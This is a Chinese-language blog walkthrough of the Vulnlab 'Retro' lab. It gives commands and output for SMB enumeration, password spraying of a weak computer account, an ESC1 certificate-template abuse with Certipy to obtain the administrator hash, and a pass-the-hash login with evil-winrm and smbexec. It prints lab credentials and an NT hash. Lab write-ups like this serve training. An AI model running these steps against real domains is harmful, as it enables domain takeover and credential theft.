---
title: "Retro"
date: 2024-05-03
tags: ["vulnlab", "windows"]
draft: false
categories: walkthrough
featured_image: "https://assets.vulnlab.com/retro_slide.png"

---

![](https://assets.vulnlab.com/retro_slide.png)

从Discord拿到IP  10.10.120.215

网络扫描


```bash
$ export rip=10.10.120.215
$ sudo nmap -v -A -Pn -p- $rip
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-03 01:20:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-23T21:06:31
| Not valid after:  2024-07-22T21:06:31
| MD5:   c1f0:bac7:16e0:71c2:bcb9:4327:3d56:9612
|_SHA-1: 7f37:ea69:6598:2430:f918:0a65:bcad:de76:add6:fea6
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-23T21:06:31
| Not valid after:  2024-07-22T21:06:31
| MD5:   c1f0:bac7:16e0:71c2:bcb9:4327:3d56:9612
|_SHA-1: 7f37:ea69:6598:2430:f918:0a65:bcad:de76:add6:fea6
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-23T21:06:31
| Not valid after:  2024-07-22T21:06:31
| MD5:   c1f0:bac7:16e0:71c2:bcb9:4327:3d56:9612
|_SHA-1: 7f37:ea69:6598:2430:f918:0a65:bcad:de76:add6:fea6
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-23T21:06:31
| Not valid after:  2024-07-22T21:06:31
| MD5:   c1f0:bac7:16e0:71c2:bcb9:4327:3d56:9612
|_SHA-1: 7f37:ea69:6598:2430:f918:0a65:bcad:de76:add6:fea6
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   DNS_Tree_Name: retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-05-03T01:21:28+00:00
|_ssl-date: 2024-05-03T01:22:07+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Issuer: commonName=DC.retro.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-02T00:27:56
| Not valid after:  2024-11-01T00:27:56
| MD5:   a57c:61d5:e4b1:10d3:1f36:033a:b756:e6e4
|_SHA-1: 746e:93af:5c11:1adc:7670:d07d:8dc7:13af:7b71:091f
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49723/tcp open  msrpc         Microsoft Windows RPC
49859/tcp open  msrpc         Microsoft Windows RPC

```


探测smb信息

```bash
$ crackmapexec smb 10.10.120.215 
SMB         10.10.120.215   445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
$ smbclient -L //10.10.120.215
```

![](https://static.guyu.pro/vulnlab/Retro/1.webp)

发现目录Trainees和Notes

```bash
$ /home/kali/.local/share/pipx/venvs/netexec/bin/lookupsid.py anonymous@10.10.120.215 -no-pass

[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: RETRO\Administrator (SidTypeUser)
501: RETRO\Guest (SidTypeUser)
502: RETRO\krbtgt (SidTypeUser)
512: RETRO\Domain Admins (SidTypeGroup)
513: RETRO\Domain Users (SidTypeGroup)
514: RETRO\Domain Guests (SidTypeGroup)
515: RETRO\Domain Computers (SidTypeGroup)
516: RETRO\Domain Controllers (SidTypeGroup)
517: RETRO\Cert Publishers (SidTypeAlias)
518: RETRO\Schema Admins (SidTypeGroup)
519: RETRO\Enterprise Admins (SidTypeGroup)
520: RETRO\Group Policy Creator Owners (SidTypeGroup)
521: RETRO\Read-only Domain Controllers (SidTypeGroup)
522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
525: RETRO\Protected Users (SidTypeGroup)
526: RETRO\Key Admins (SidTypeGroup)
527: RETRO\Enterprise Key Admins (SidTypeGroup)
553: RETRO\RAS and IAS Servers (SidTypeAlias)
571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
1000: RETRO\DC$ (SidTypeUser)
1101: RETRO\DnsAdmins (SidTypeAlias)
1102: RETRO\DnsUpdateProxy (SidTypeGroup)
1104: RETRO\trainee (SidTypeUser)
1106: RETRO\BANKING$ (SidTypeUser)
1107: RETRO\jburley (SidTypeUser)
1108: RETRO\HelpDesk (SidTypeGroup)
1109: RETRO\tblack (SidTypeUser)
```



尝试匿名访问

```bash
smb://10.10.120.215/trainees/
```

![](https://static.guyu.pro/vulnlab/Retro/2.webp)



```bash
$ cat users.txt             
trainee
BANKING$
jburley
tblack
$ kerbrute userenum --dc 10.10.120.215 -d retro.vl users.txt -v
```

![](https://static.guyu.pro/vulnlab/Retro/3.webp)



```bash
$ crackmapexec smb 10.10.120.215 -u users.txt -p users.txt --continue-on-success
```

![](https://static.guyu.pro/vulnlab/Retro/4.webp)

发现banking$用户密码是banking

查看notes目录，使用trainee用户，密码trainee

```bash
$ crackmapexec smb 10.10.120.215 -u 'trainee' -p 'trainee' --shares 
```

![](https://static.guyu.pro/vulnlab/Retro/5.webp)

使用`smbpasswd`尝试修改banking$用户密码失败

```bash
$ smbpasswd -r 10.10.120.215 -U banking$
```

![](https://static.guyu.pro/vulnlab/Retro/6.webp)


使用`kpasswd`尝试修改banking$用户密码成功

```bash
$ cat /etc/krb5.conf
```

![](https://static.guyu.pro/vulnlab/Retro/7.webp)

```bash
$ sudo vim /etc/hosts
10.10.120.215   dc.retro.vl
10.10.120.215   retro.vl


```

![](https://static.guyu.pro/vulnlab/Retro/8.webp)

```bash
kpasswd BANKING$
banking
P@ss1234
```

![](https://static.guyu.pro/vulnlab/Retro/9.webp)


使用`certipy-ad` 探测

```bash
$ certipy-ad find -u 'BANKING$' -p 'P@ss1234' -dc-ip 10.10.120.215 -stdout -vulnerable
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'retro-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'retro-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'retro-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'retro-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
        Write Property Principals       : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'RETRO.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

![](https://static.guyu.pro/vulnlab/Retro/10.webp)

申请证书

```bash
$ certipy-ad req -u 'BANKING$'@retro.vl -p 'P@ss1234' -c 'retro-DC-CA' -target 'dc.retro.vl' -template 'RetroClients' -upn 'administrator' -key-size 4096
```

![](https://static.guyu.pro/vulnlab/Retro/11.webp)

获得hash

```bash
$ certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain 'retro.vl' -dc-ip 10.10.120.215 
```

![](https://static.guyu.pro/vulnlab/Retro/12.webp)

使用`evil-winrm`

```bash
$ evil-winrm -i 10.10.120.215 -u 'administrator' -H "252fac7066d93dd009d4fd2cd0368389"
```

![](https://static.guyu.pro/vulnlab/Retro/13.webp)

使用`smbexec.py`

```bash
$ /home/kali/.local/share/pipx/venvs/netexec/bin/smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389 retro.vl/administrator@10.10.120.215

```

![](https://static.guyu.pro/vulnlab/Retro/14.webp)